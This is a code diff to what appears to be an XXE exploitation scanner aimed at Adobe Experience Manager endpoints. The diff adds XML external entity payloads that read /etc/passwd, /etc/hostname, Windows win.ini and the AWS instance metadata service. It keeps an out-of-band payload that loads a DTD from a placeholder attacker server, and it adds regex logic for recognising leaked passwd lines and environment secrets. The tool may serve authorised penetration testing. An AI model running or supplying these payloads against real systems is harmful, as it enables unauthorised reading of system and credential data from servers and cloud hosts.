@@ -24,14 +24,27 @@ AEM_ENDPOINTS = [
     "/lc/content/submit",
 ]
 
-AEM_NOISE = ("<html", "doctype html", "csrf", "forbidden", "not found")
-
 SAFE_CANARY = "AEMPWN_" + hashlib.sha1(str(time.time()).encode()).hexdigest()[:10]
 SAFE_CANARY_PAYLOAD = f"<request><probe>{SAFE_CANARY}</probe></request>"
 
-XXE_LOCAL = """<?xml version="1.0"?>
+XXE_PROBES = {
+    "linux_hostname": """<?xml version="1.0"?>
 <!DOCTYPE t [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
-<request><probe>&xxe;</probe></request>"""
+<request><probe>&xxe;</probe></request>""",
+
+    "linux_passwd": """<?xml version="1.0"?>
+<!DOCTYPE t [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<request><probe>&xxe;</probe></request>""",
+
+    "windows_ini": """<?xml version="1.0"?>
+<!DOCTYPE t [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
+<request><probe>&xxe;</probe></request>""",
+
+    "aws_metadata": """<?xml version="1.0"?>
+<!DOCTYPE t [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/hostname"> ]>
+<request><probe>&xxe;</probe></request>""",
+}
+
 
 XXE_OOB = """<?xml version="1.0"?>
 <!DOCTYPE t [ <!ENTITY % r SYSTEM "http://YOUR_SERVER/evil.dtd"> %r; ]>
@@ -67,20 +80,45 @@ def post(url, body):
         allow_redirects=False,
     )
 
-def clean_resp(txt):
-    if not txt:
-        return ""
-    low = txt.lower()
-    if any(n in low for n in AEM_NOISE):
-        return ""
-    return txt.strip()
+def looks_like_leak(text: str) -> bool:
+    if not text:
+        return False
+    t = text.strip()
+    # Too big = almost certainly framework error page
+    if len(t) > 200:
+        return False
+    low = t.lower()
+    # Generic structured response killers (not vendor-specific)
+    BLOCKERS = (
+        "<html",
+        "<!doctype",
+        "<?xml",
+        "<error",
+        "fault",
+        "exception",
+        "access denied",
+        "not found",
+        "forbidden",
+        "method not allowed",
+        "{",
+        "}",
+    )
+    if any(b in low for b in BLOCKERS):
+        return False
+    # Common real file leak patterns
+    # hostnames, container names, short config values, passwd lines, env-style
+    SIMPLE_FILE_PATTERNS = [
+        r"^[a-zA-Z0-9][a-zA-Z0-9\-\.]{2,40}$",         # hostname
+        r"^ip-\d+-\d+-\d+-\d+$",                     # AWS style hostname
+        r"^[a-zA-Z0-9_\-]+$",                        # simple token/string
+        r"^[^:]+:[^:]*:\d+:\d+:",                    # /etc/passwd line
+        r"^[A-Z_]+=.+$",                             # ENV=value
+    ]
+    for p in SIMPLE_FILE_PATTERNS:
+        if re.match(p, t):
+            return True
+    return False
 
-def looks_like_leak(txt):
-    if not txt or len(txt) > 300:
-        return False
-    if any(n in txt.lower() for n in AEM_NOISE):
-        return False
-    return bool(re.search(r"[a-zA-Z0-9\-_]{3,}", txt))
 
 def behavior_probe(url):
     try:
@@ -110,14 +148,15 @@ def scan_target(target, oob, rce, verbose):
             hits.append(f"Unsafe XML parser surface at {ep}")
             score += 1
 
-        try:
-            r = post(url, XXE_LOCAL)
-            leak = clean_resp(r.text)
-            if looks_like_leak(leak):
-                hits.append(f"XXE file read at {ep}: {leak}")
-                score += 3
-        except:
-            pass
+        for name, payload in XXE_PROBES.items():
+            try:
+                r = post(url, payload)
+                leak = r.text
+                if looks_like_leak(leak):
+                    hits.append(f"XXE {name} leak at {ep}: {leak.strip()}")
+                    score += 3
+            except:
+                pass
 
     if not surface and score == 0:
         if verbose:
